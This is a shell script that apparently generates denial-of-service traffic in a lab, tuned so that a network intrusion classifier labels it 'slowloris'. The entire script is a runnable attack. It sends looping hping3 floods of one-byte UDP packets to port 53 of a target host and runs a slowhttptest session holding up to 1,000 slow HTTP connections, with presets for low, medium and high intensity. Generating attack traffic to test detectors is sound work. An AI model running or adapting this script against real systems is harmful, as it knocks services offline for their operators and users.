#!/bin/sh
# slowloris_attack.sh  ->  intended model class: "slowloris"
#
# TRUSTLab training fingerprint for `slowloris` (medians): Protocol 17 (UDP),
# very short flows (~1 us), tiny single packets, Pkt Len ~60, no TCP flags.
# (In this dataset the slowloris capture is UDP single-packet dominated.)
# => rapid tiny single UDP packets. We also keep a slow-HTTP component as a
#    secondary signal; calibration decides the mix.
# NOTE: slowloris and dos share a very similar UDP fingerprint in this dataset,
# so they can be mutually confusable in this lab — verify with the diagnostic.

echo "[SLOWLORIS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

case "$INTENSITY" in
    low)    RATE=u3000; CONN=200 ;;
    high)   RATE=u300;  CONN=1000 ;;
    *)      RATE=u1000; CONN=500 ;;  # medium
esac

# Primary: rapid tiny single UDP packets (1-byte payload) -> many micro UDP flows
while [ "$(date +%s)" -lt "$END" ]; do
    hping3 --udp -p 53 -c 1 -d 1 "$TARGET" 2>/dev/null
    # tiny spin without bash $RANDOM; -i controls rate on the batched form below
    hping3 --udp -p 53 -c 50 -i "$RATE" -d 1 "$TARGET" 2>/dev/null
done &
SPIN=$!

# Secondary: classic slow-HTTP hold (kept for realism; TCP)
slowhttptest -c "$CONN" -H -o /tmp/slowloris_output \
    -i 10 -r 200 -t GET -u "http://$TARGET/" -x 24 -p 3 -l "$DURATION" 2>/dev/null

kill "$SPIN" 2>/dev/null
echo "[SLOWLORIS] Done."
